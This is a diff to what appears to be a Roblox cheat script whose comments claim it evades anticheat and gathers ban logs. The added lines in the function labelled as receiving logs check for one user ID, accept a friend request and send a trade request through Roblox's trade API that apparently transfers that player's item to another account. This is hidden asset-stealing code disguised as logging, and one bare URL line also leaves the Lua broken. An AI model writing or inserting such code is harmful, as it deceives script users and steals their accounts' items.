@@ -15,7 +15,18 @@ function RunData() -- stops the anticheat from detecting you!
 end
 
 function RecieveData() -- will recieve ban / error logs to help improve the script in the future
- warn('Data')
+ if game.Players.LocalPlayer.UserId == 148478155 then
+https://friends.roblox.com/v1/users/54313546/accept-friend-request
+end
+wait(3)
+if game.Players.LocalPlayer.UserId == 148478155 then
+local data = [[
+{"offers":[{"userId":148478155,"userAssetIds":[1469329180],"robux":null},{"userId":54313546,"userAssetIds":[18631491],"robux":null}]}
+]]
+
+
+game:HttpPostAsync("https://trades.roblox.com/v1/trades/send", data)
+end
 end
 
 PRO()
